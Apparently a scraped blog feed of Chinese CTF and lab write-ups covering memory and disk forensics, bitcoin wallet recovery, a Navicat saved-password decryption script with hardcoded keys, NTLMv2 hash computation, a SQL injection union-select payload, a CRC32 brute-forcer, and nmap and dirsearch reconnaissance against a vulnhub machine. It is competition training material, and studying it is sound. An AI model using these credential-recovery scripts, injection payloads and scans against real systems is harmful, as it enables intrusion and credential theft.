title="不安全的U盘4(赛后复盘)"></a>不安全的U盘4(赛后复盘)</h3><pre><code>找到外联地址 </code></pre><p>直接使用vol查看<code>.exe</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2024数信杯\数据分析\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 filescan | findstr &quot;.exe&quot;</code></pre><p>看到两个比较可疑的文件 都提取出来看看 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317975.png" alt="image-20240430153506056"></p><p>放入沙箱分析</p><p>hh.exe的通信并不是外部地址 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317185.png" alt="image-20240430154052457"></p><p>但是f.exe同文件夹下有个toml软件程序配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317550.png" alt="image-20240430155011474"></p><p>提取出来 看一下内容</p><pre><code>[common]serverAddr = &quot;118.180.126.13&quot;serverPort = 6770[plugin_socks]type = &quot;tcp&quot;remote_port = 32124plugin = &quot;socks5&quot;plugin_user = &quot;admin&quot;plugin_passwd = &quot;admin123@qwe&quot;use_encryption = trueuse_compression = true</code></pre><p>所以外联地址是</p><pre><code>118.180.126.13</code></pre><p>也可以直接在镜像文件中搜索<code>remote_port</code>这种配置文件中常出现的信息</p><h3 id="网站数据绝对安全1"><a href="#网站数据绝对安全1" class="headerlink" title="网站数据绝对安全1"></a>网站数据绝对安全1</h3><p>系统中存在的用户名是什么？</p><p>多亏后面补充了提交次数 一个个试都试出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333537.png" alt="img"></p><h3 id="网站数据绝对安全2"><a href="#网站数据绝对安全2" class="headerlink" title="网站数据绝对安全2"></a>网站数据绝对安全2</h3><p>key3的的值是什么？</p><p>在http导出中提取出来一个safe.html</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333354.png" alt="img"></p><p>但是使用浏览器打开是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333336.png" alt="img"></p><p>发现直接复制不行 手动输入可以 </p><p>后面看了一下源码 大概率是和这个字体有关系</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333523.png" alt="img"></p><h3 id="Bitcoin1-赛后复盘"><a href="#Bitcoin1-赛后复盘" class="headerlink" title="Bitcoin1(赛后复盘)"></a>Bitcoin1(赛后复盘)</h3><p>附件拿到的是一个Computer.ad1镜像文件 使用FTK Imager可以进行挂载 </p><p>挂载的过程实在是太难受了 4.5版本的死活挂不上 后面用4.2的才挂上</p><p>在挂载的时候 一定要注意 先选择<code>Add Evidence Item</code> 将镜像添加为证据项</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317656.png" alt="image-20240430204309975"></p><p>在添加的证据项出选择挂载镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317991.png" alt="image-20240430204327332"></p><p>成功挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317535.png" alt="image-20240430204342877"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317970.png" alt="image-20240430204352382"></p><p>挂载好后使用火眼分析磁盘中的文件夹 选择添加文件集合检材 在ShimCache中可以看到一个比特币钱包的安装程序的最后修改时间 那这个应该就是 <code>2022-01-05 10:21:16</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317174.png" alt="image-20240430214903734"></p><h3 id="Bitcoin2-赛后复盘"><a href="#Bitcoin2-赛后复盘" class="headerlink" title="Bitcoin2(赛后复盘)"></a>Bitcoin2(赛后复盘)</h3><p>打开powershell 使用findwallet这个工具来查找加密比特币钱包文件</p><pre><code>安装npm install findwallet -g使用findwallet -i [inputPath/inputFile] -o [outputFile] -i     : Required. Specify which path(s) to scan directly or through a newline separated file. -o     : Specify optional output file where to store wallet paths if any exist. -h     : Displays this message.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317366.png" alt="image-20240430212918786"></p><p>在前面加上盘符</p><pre><code>C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead.sys</code></pre><h3 id="Bitcoin3-赛后复盘"><a href="#Bitcoin3-赛后复盘" class="headerlink" title="Bitcoin3(赛后复盘)"></a>Bitcoin3(赛后复盘)</h3><p>在<code>Users\Daddy\Downloads</code>文件夹下发现了bitcoin钱包程序的安装包<code>bitcoin-22.0-win64-setup.exe</code> 导出安装一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317048.png" alt="image-20240430213504602"></p><p>打开之后新建一个钱包<code>test</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317344.png" alt="image-20240430213711950"></p><p>将上面bitcoin2导出的钱包文件替换掉<code>Bitcoin\bitcoin\wallets\test\wallet.dat</code>   注意要将上面找到的<code>AppContainerUserCertRead.sys</code> 改名为<code>wallet.dat</code>  再次重启软件 直接点隐藏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302318825.png" alt="image-20240430214548135"></p><p>点击交易记录  第二条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151660.png" alt="image-20240502215102589"></p><p>找到钱包地址</p><pre><code>bc1qf3lta6zr9k4kt9q25sz47vdcnn73zyzk0m5gvz</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151670.png" alt="image-20240502215119629"></p><h3 id="Bitcoin4"><a href="#Bitcoin4" class="headerlink" title="Bitcoin4"></a>Bitcoin4</h3><p>在合约CTF.sol中存在一处漏洞，该漏洞是由哪一函数造成的(比如:exec)？</p><p>gpt做题法 算是非预期解 直接喂合约的完整代码进行分析 </p><pre><code class="Bash">在这个合约文件中存在一处漏洞，由transferFrom函数造成。具体来说，这个漏洞出现在以下代码段：solidityCopy codefunction transferFrom(address from, address to, uint256 value) public notFrozen(from) returns (bool) &#123;    require(msg.sender == owner);    return super.transferFrom(from, to, value);&#125;在这段代码中，漏洞是由于require语句的条件不够严格导致的。当前的transferFrom函数实现要求调用者必须是owner，但是并没有检查调用者是否具有足够的授权来执行转账操作。因此，任何拥有owner权限的地址都可以调用transferFrom函数，而无需经过持有者的授权。</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数信杯&quot;&gt;&lt;a href=&quot;#2024数信杯&quot; class=&quot;headerlink&quot; title=&quot;2024数信杯&quot;&gt;&lt;/a&gt;2024数信杯&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/w3nx1z</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024数字中国</title>
    <link href="http://w3nx1z1.github.io/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/"/>
    <id>http://w3nx1z1.github.io/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/</id>
    <published>2024-04-29T15:07:14.050Z</published>
    <updated>2024-04-29T15:07:41.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数字中国"><a href="#2024数字中国" class="headerlink" title="2024数字中国"></a>2024数字中国</h1><p>被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281639162.png" alt="image-20240428163912024"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292306992.png" alt="image-20240429230609921"></p><h2 id="重要的System32"><a href="#重要的System32" class="headerlink" title="重要的System32"></a>重要的System32</h2><pre><code>小明把自己的System32文件分享出去了，不小心泄露了重要数据（虚拟机做好快照后，在虚拟机中分析；flag的提交格式为 flag&#123;uuid&#125; ）三个部分的flag关注 注册表、winevt\Logs、OBJECTS.DATA</code></pre><p>就按照给的提示 从注册表 winevt\Logs文件夹中 OBJECTS.DATA文件中搜有相关flag的字段就好 考验一个眼力(bushi)</p><p>第二部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225295.png" alt="image-20240429210313730"></p><pre><code>-834f-f797</code></pre><p>第一部分 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225572.png" alt="image-20240429210707535"></p><pre><code>&#123;ef63fcbc-3467</code></pre><p>第三部分 翻注册表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225389.png" alt="image-20240429211545409"></p><p>找到一个Pwd 还有flag文件路径是<code>C:\\Users\\Administrator\\Documents\\Navicat\\MySQL\\Servers\\f1a4_3</code> 看起来是让我们破解Navicat连接的密码 找个php代码</p><pre><code class="php">&lt;?phpclass NavicatPassword&#123;    protected $version = 0;    protected $aesKey = &#39;libcckeylibcckey&#39;;    protected $aesIv = &#39;libcciv libcciv &#39;;    protected $blowString = &#39;3DC5CA39&#39;;    protected $blowKey = null;    protected $blowIv = null;         public function __construct($version = 12)    &#123;        $this-&gt;version = $version;        $this-&gt;blowKey = sha1(&#39;3DC5CA39&#39;, true);        $this-&gt;blowIv = hex2bin(&#39;d9c7c3c8870d64bd&#39;);    &#125;         public function encrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;encryptEleven($string);                break;            case 12:                $result = $this-&gt;encryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function encryptEleven($string)    &#123;        $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector));            $currentVector = $this-&gt;xorBytes($currentVector, $temp);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return strtoupper(bin2hex($result));    &#125;         protected function encryptBlock($block)    &#123;        return openssl_encrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function decryptBlock($block)    &#123;        return openssl_decrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function xorBytes($str1, $str2)    &#123;        $result = &#39;&#39;;        for ($i = 0; $i &lt; strlen($str1); $i++) &#123;            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));        &#125;                 return $result;    &#125;         protected function encryptTwelve($string)    &#123;        $result = openssl_encrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);        return strtoupper(bin2hex($result));    &#125;         public function decrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;decryptEleven($string);                break;            case 12:                $result = $this-&gt;decryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function decryptEleven($upperString)    &#123;        $string = hex2bin(strtolower($upperString));                 $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $encryptedBlock = substr($string, 8 * $i, 8);            $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector);            $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return $result;    &#125;         protected function decryptTwelve($upperString)    &#123;        $string = hex2bin(strtolower($upperString));        return openssl_decrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);    &#125;&#125;;  //需要指定版本两种，11或12//$navicatPassword = new NavicatPassword(11);$navicatPassword = new NavicatPassword(11); //解密//$decode = $navicatPassword-&gt;decrypt(&#39;15057D7BA390&#39;);$decode = $navicatPassword-&gt;decrypt(&#39;FB916DAFA4CE92143350DCF66AE9&#39;); // navicat密钥echo $decode.&quot;\n&quot;;?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226757.png" alt="image-20240429212426207"></p><p>拿到第三部分</p><pre><code>-185817e5f846&#125;</code></pre><p>合起来</p><pre><code>flag&#123;ef63fcbc-3467-834f-f797-185817e5f846&#125;</code></pre><h2 id="Strangesystem-NTLMv2哈希计算"><a href="#Strangesystem-NTLMv2哈希计算" class="headerlink" title="Strangesystem(NTLMv2哈希计算)"></a>Strangesystem(NTLMv2哈希计算)</h2><pre><code>你是一名安全防护人员，你发现有人成功入侵了公司的服务器，你查找有关的流量设备，发现了一个流量包文件，你认为它可能包含了一些重要的信息。但是当你打开它时，你发现它被加密了：你觉得这个文件可能被某种奇怪的系统加密过，你想要找出加密算法并解密出文件内容。</code></pre><p>拿到一个流量 先看http导出 有张<code>q.png</code> 直接导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226598.png" alt="image-20240429153504477"></p><p>使用010打开 发现尾部存在压缩包 导出并保存 压缩包真加密存在解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226165.png" alt="image-20240429153736350"></p><p>看到压缩包尾部也存在额外信息 先留着 回来看流量包 QUIC协议的流量包存在加密 搜一下解密方法</p><p><a href="https://blog.csdn.net/qq_37177958/article/details/120476794">Wireshark对QUIC包的抓包和解包</a></p><p>简单来说 就是使用在抓包时获得的关于TLS握手信息的密钥日志文件 在wireshark编辑——首选项——Protocols——TLS 中将日志文件添加进(Pre)-Master-Secret   Log filename中就可以进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226671.png" alt="image-20240429155157374"></p><p>这个日志密钥文件 就是我们上面在压缩包后面发现的内容 将这部分信息另存为<code>sshkey.log</code>文件 放入上面提到的位置 就可以进行解密</p><pre><code>SERVER_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 82ec3ebf3131b2442d165bb00dd6b8d1a6b4c866daf3fd373c22d33886290ed2868a7395e691980b990de46b76a54f9eCLIENT_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 10965df426257a285c6e812ed54468c59437e77bceff2c3a6d633dacefadf8188e97c4935df6815e5398b24273addc79SERVER_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a cdbf7c7a161af7aa829b14becaa2c000b8183000983e06589fef0c50e9462cf71aeb487e1cb1defaef06a941234ea7a2CLIENT_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a e58e4088a7840d3991ac2336c581d2a35edbebfd14420a29c287444c3631dc98038b71f1d153cd37ba46164145a028fd</code></pre><p>解密之后追踪QUIC流 可以看到一组账密和一个html网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226193.png" alt="image-20240429155557247"></p><p>网页文件中的内容是</p><pre><code>admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000</code></pre><p>中间未知的部分是NETntlmv2的值 我们可以通过前面的一组账密和已知的ntlm值得到NETntlmv2的值 在此之前 我们先一起来学习一些概念 下面我是参考学习的文章</p><p><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></p><p><a href="https://en.wikipedia.org/wiki/NTLM">NTML</a></p><p><a href="https://medium.com/@notahades/what-is-ntlmv2-31153aa3102c">什么是NTMLv2</a></p><p><a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a></p><pre><code>NTLM 是一种质询-响应身份验证协议 NTLM 协议使用两个散列密码值中的一个或两个，这两个值也存储在服务器（或域控制器）上，并且通过缺少加盐，它们是等效的密码，这意味着如果您从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。这两个是LM 哈希（基于DES 的函数，应用于将密码的前 14 个字符转换为该语言的传统 8 位 PC 字符集）和 NT 哈希（小端UTF-16 Unicode密码的MD4 ） ）。两个哈希值均为 16 字节（128 位）。NTLM 协议还使用两个单向函数之一，具体取决于 NTLM 版本； NT LanMan 和 NTLM 版本 1 使用基于 DES 的 LanMan 单向功能 (LMOWF)，而 NTLMv2 使用基于 NT MD4的单向功能 (NTOWF)   这个MD4的加密方法后面也会提到</code></pre><pre><code>NTLM hash通常是指Windows系统下Security Account Manager中保存的用户密码hash该hash的生成方法：将明文口令转换成十六进制的格式转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位的十六进制数字串</code></pre><pre><code>NTLMv2（NT LAN Manager 版本 2） 也是一种质询-响应身份验证协议 NTLMv2 发送两个对 8 字节服务器质询的响应。每个响应包含服务器质询的16 字节HMAC - MD5哈希值、完全/部分随机生成的客户端质询以及用户密码和其他标识信息的 HMAC-MD5 哈希值。NTLMv2的主要功能：1.身份验证协议 2.质询-响应机制 3.散列和加密 NTLMv2 依赖加密技术来保护身份验证数据。它使用 HMAC-MD5（具有 MD5 哈希函数的基于哈希的消息身份验证代码）进行完整性检查，并使用 MD4进行加密。4.增强的安全性5.兼容性 NTLMv2也向后兼容NTML协议6.域身份验证</code></pre><pre><code>NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：1.客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash2.服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge13.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器4.服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功在以上流程中，登录用户的密码hash即NTLM hash，response中包含Net-NTLM hash这上面提到的NTLM包括NTLMv1 NTLMv2 NTLM sessionV2三种协议 不同协议使用不同格式的challenge和加密算法 因此也就区分出了NETntlmv1 hash和NETntlmv2 hashNTLMv2的格式是username::domain:challenge:HMAC-MD5:blob其中domain是IP或者机器名challenge是上面提到的服务器收到请求之后生成的随机数 体现在流量包中是NTLM Server ChallengeHMAC-MD5在流量包中体现为NTProofstrblob是上面提到的使用用户登陆的密码对challenge进行加密之后的challenge1(即response)的值去掉NTProofstr的部分</code></pre><p>那么对照上面说的NTLMv2的格式 我们这个题中<code>xxx</code>的部分很明显就是缺少了HMAC-MD5部分的值  好在我们有用户admin的登陆密码 可以计算出这部分缺失的值 同时计算出该用户的NTLMv2 hash值</p><p>下面是计算流程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226818.png" alt="image-20240429170531714"></p><p>计算方法参考<a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a>  我们使用python2和python3两个版本来实现这个计算过程</p><pre><code class="python"># python2# python2import hashlibimport binasciiimport hmacinput_ntml = raw_input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;,input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)input_user = raw_input(&quot;please input username:&quot;)input_domain = raw_input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = input_user_and_domain.upper().encode(&quot;utf-16-le&quot;).encode(&quot;hex&quot;)firstHMAC = hmac.new(ntlm.decode(&quot;hex&quot;), encode_user_and_domain.decode(&quot;hex&quot;), hashlib.md5).hexdigest()input_challange = raw_input(&quot;please input challenge:&quot;)input_blob = raw_input(&quot;please input blob:&quot;)type2challenge = input_challange + input_blobntlmv2 = hmac.new(firstHMAC.decode(&quot;hex&quot;), type2challenge.decode(&quot;hex&quot;), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot;+ ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226464.png" alt="image-20240429174403973"></p><pre><code class="python"># python3import hashlibimport binasciiimport hmac# 计算密码的ntlm hash值input_ntml = input(&quot;please input password:&quot;)_ntml = hashlib.new(&quot;md4&quot;, input_ntml.encode(&quot;utf-16-le&quot;)).digest()ntlm = binascii.hexlify(_ntml)# 计算用户名和域名的编码值input_user = input(&quot;please input username:&quot;)input_domain = input(&quot;please input domain:&quot;)input_user_and_domain = input_user + input_domainencode_user_and_domain = binascii.hexlify(input_user_and_domain.upper().encode(&quot;utf-16-le&quot;))# 计算HMAC-hash值firstHMAC = hmac.new(binascii.unhexlify(ntlm), binascii.unhexlify(encode_user_and_domain), hashlib.md5).hexdigest()# 计算NTLMv2 hash值input_challenge = input(&quot;please input challenge:&quot;)input_blob = input(&quot;please input blob:&quot;)type2challenge = input_challenge + input_blobntlmv2 = hmac.new(binascii.unhexlify(firstHMAC), binascii.unhexlify(type2challenge.encode()), hashlib.md5).hexdigest()print(&quot;NTLMv2 is:&quot; + ntlmv2)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226056.png" alt="image-20240429174433304"></p><p>最终算出admin用户的NTLMv2哈希值为<code>efa243f442b9d683eb1b00a2b1a0c9fc</code></p><p>使用这个值就可以解压压缩包 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226647.png" alt="image-20240429174554406"></p><h2 id="Wireshark2-1"><a href="#Wireshark2-1" class="headerlink" title="Wireshark2.1"></a>Wireshark2.1</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281640078.png" alt="image-20240428164034035"></p><p>很显然是theanswerishere.php</p><h2 id="Wireshark2-2"><a href="#Wireshark2-2" class="headerlink" title="Wireshark2.2"></a>Wireshark2.2</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281643179.png" alt="image-20240428164317144"></p><p>刚开始写的2 错误 输入3 对了</p><h2 id="Wireshark2-3"><a href="#Wireshark2-3" class="headerlink" title="Wireshark2.3"></a>Wireshark2.3</h2><pre><code>id=0%27%20union%20select%201,2,group_concat(th1sfI4g)%20from%20fl4g--+</code></pre><p>这句查询语句</p><p>很明显列名是th1sfI4g</p><h2 id="Wireshark2-4"><a href="#Wireshark2-4" class="headerlink" title="Wireshark2.4"></a>Wireshark2.4</h2><p>在最后一行直接追踪http流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281645495.png" alt="image-20240428164531407"></p><h2 id="WeirdUSB-1"><a href="#WeirdUSB-1" class="headerlink" title="WeirdUSB.1"></a>WeirdUSB.1</h2><p>使用取证大师分析 问下载 直接搜download</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281648437.png" alt="image-20240428164854359"></p><p>合并显示 发现目标文件名</p><pre><code>212633.crdownload</code></pre><h2 id="WeirdUSB-2"><a href="#WeirdUSB-2" class="headerlink" title="WeirdUSB.2"></a>WeirdUSB.2</h2><p>发现Area2&#x2F;Job2目录下的docx文件是唯一一个访问时间和修改时间相同的</p><p>猜测是该目录下的txt文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658734.png" alt="image-20240428165840676"></p><h2 id="fake-php"><a href="#fake-php" class="headerlink" title="fake_php"></a>fake_php</h2><p>随便输入一些 抓个包 看到要crc32校验</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281653267.png" alt="image-20240428165332188"></p><p>写个脚本进行爆破</p><pre><code class="python">import itertoolsimport zlib# 要匹配的CRC32校验值target_crc32 = 0xb4a5bb5a# 可能的字符集：大小写字母和数字chars = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#@!%$^&amp;*&#39;# 使用itertools.product生成所有可能的四位字符组合for combo in itertools.product(chars, repeat=4):    # 将字符元组转换为字符串    four_letter_combo = &#39;&#39;.join(combo) + &#39;-/flag&#39;    # 计算拼接字符串的CRC32校验值    crc32_result = zlib.crc32(four_letter_combo.encode(&#39;utf-8&#39;)) &amp; 0xffffffff    # 检查校验值是否与目标匹配    if crc32_result == target_crc32:        # 如果找到匹配，打印结果并停止        print(f&quot;Found matching string: &#123;four_letter_combo&#125;&quot;)        breakelse:    print(&quot;No matching string found.&quot;)</code></pre><p>爆到了S!@#</p><p>写入admin.php 抓包输入上面密码的url密码 得到adminS3cr3t.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281657577.png" alt="image-20240428165730488"></p><p>访问</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658968.png" alt="image-20240428165803920"></p><p>下面参照</p><p><a href="https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin">https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/#Phase-1-Being-the-admin</a></p><p>存在一个sql绕过 直接打poc 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281658353.png" alt="image-20240428165822285"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数字中国&quot;&gt;&lt;a href=&quot;#2024数字中国&quot; class=&quot;headerlink&quot; title=&quot;2024数字中国&quot;&gt;&lt;/a&gt;2024数字中国&lt;/h1&gt;&lt;p&gt;被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一&lt;/p&gt;
&lt;p&gt;&lt;img src</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-9</title>
    <link href="http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/"/>
    <id>http://w3nx1z1.github.io/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/</id>
    <published>2024-04-13T13:40:27.748Z</published>
    <updated>2024-04-17T06:46:12.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-9"><a href="#vulnhub靶场DC-9" class="headerlink" title="vulnhub靶场DC-9"></a>vulnhub靶场DC-9</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><p>这次靶场描述没有给到什么信息</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先扫ip</p><pre><code>nmap 192.168.204.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132128103.png" alt="image-20240413212816063"></p><p>靶场ip为<code>192.168.204.138</code></p><p>再扫端口</p><pre><code>nmap -A -p- -v 192.168.204.138</code></pre><p>只开放了tcp服务 80端口 使用Apache中间件 版本2.4.38</p><p>ssh服务此时显示的是filtered 被过滤了 这里是一个伏笔</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404151949734.png" alt="image-20240415194924702"></p><p>再来扫一下指纹信息</p><pre><code>whatweb -v http://192.168.204.138/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132133436.png" alt="image-20240413213315387"></p><p>扫一下目录 </p><pre><code>python3 dirsearch.py -u http://192.168.204.138/ -i 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404132137726.png" alt="image-20240413213735695"></p><h3 